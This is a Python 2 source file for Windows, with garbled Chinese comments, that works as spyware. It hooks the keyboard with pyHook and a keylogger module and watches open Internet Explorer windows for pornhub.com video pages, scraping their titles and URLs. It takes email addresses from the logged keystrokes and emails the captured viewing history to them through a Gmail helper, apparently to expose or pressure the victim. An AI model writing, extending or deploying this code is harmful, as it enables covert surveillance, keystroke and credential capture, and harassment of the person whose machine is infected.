# -*- coding: cp950 -*-
import urllib2,pyHook,pythoncom
from bs4 import BeautifulSoup
import urlparse
import win32com.client
import time
from function_send_email import send_gmail
import threading
import googleOCR
import keylogger
from PIL import ImageGrab
import re
from ctypes import *


send_msg = []##mail�����e

video = "" ##A�����W�ٻPurl

to_user = []##�H�H��

target_sites  = {}##���������r��

target_sites["www.pornhub.com"] = \
    {"logout_url"      : None,
     "logout_form"     : None,
     "login_form_index": 0,
     "owned"           : False}

target_sites["mail.google.com"] = \
    {"logout_url"      : None,
     "logout_form"     : "1ml",
     "login_form_index": 0,
     "owned"           : False}
clsid='{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'##Internet Explorer��clsid

##��wim32com�i�H�h����IE�s�����A�å�windows�x�sIE�s�������s��������
windows = win32com.client.Dispatch(clsid)


# �l��������u�@���,�����O�_��A���Puser����T
def detect_get_AV_data():
    global to_user,send_msg     
    while True:
        time.sleep(5)##�C�X�����@��
        
        if len(to_user)>1 and len(send_msg)>2:##�p�G�ϥΪ̦��W�L1�� �H�� A����T���W�L2��
            send_gmail(to_user,send_msg)##�e�X�H��
            send_msg = []##�M��A����T�A�`�ٰO����
        

t = threading.Thread(target=detect_get_AV_data)# �إߤ@�Ӥl�����

t.start()# ����Ӥl�����

# screenshot
def screenshot():
    
    pic = ImageGrab.grab(bbox=(1118,400,1825,1070))
    pic.save('C:\picture\screenshop.jpg')
    print "[Image Saved]"

# ���W��ܪk
def GetEmail(filename):

    f = open(filename,'r')
    output = f.read();
    reg = re.findall(r'\b[a-zA-Z0-9_.-]+@[a-zA-Z0-9]+[\.\w-]{2,}\b',output)
    f.close()
    return reg

def Key():
    #keylogger �]�w
    keylogger.kl = pyHook.HookManager()
    keylogger.kl.KeyDown = keylogger.KeyStroke
    keylogger.kl.HookKeyboard()
    pythoncom.PumpMessages()
    

    
# �D������~�����ۤv���u�@
if __name__=='__main__':
    t = threading.Thread(target=Key)
    t.start()
    while True:
        
        for browser in windows:##���y�D���ҥ��}�Ҫ��s�����A�i�঳�\�h����
        
            url = urlparse.urlparse(browser.LocationUrl)##�C�Ӻ��������L��urlparse���R
        
            if url.hostname in target_sites:##�p�G�������O�ڭ̩w�q������(porn.com)
                try:                                                                                     
                    if "pornhub.com" in url.hostname:##��ܶi�Jporn�D����
                    
                        if "viewkey" in url.query:##��ܶi�J���@�v��
                        
                            page = urllib2.urlopen(browser.LocationUrl)##�s��url
                        
                            bs = BeautifulSoup(page,"html.parser")##��L�i�檦��
                            

                            ##�N���쪺�v�����D�Purl��video�x�s
                            video = "title = %s,url = %s" % (str(bs.title)[7:-22],browser.LocationUrl)
                            print video

                            send_msg.append(video)##�N���o�쪺video�s��send_msg
                        
                            browser.Navigate(url.hostname)##�N�����ɦ^porn�D�����A�����A�ݫ�����
                except:
                    pass

        if (keylogger.finished) == True:
            gmail = GetEmail("output.txt")
            for mail in gmail:
                to_user.append(mail)
                keylogger.finished = False;
                            
        time.sleep(5)##�C�����@���s�����N�𮧭�5��a�A���Ψ��򨯭W
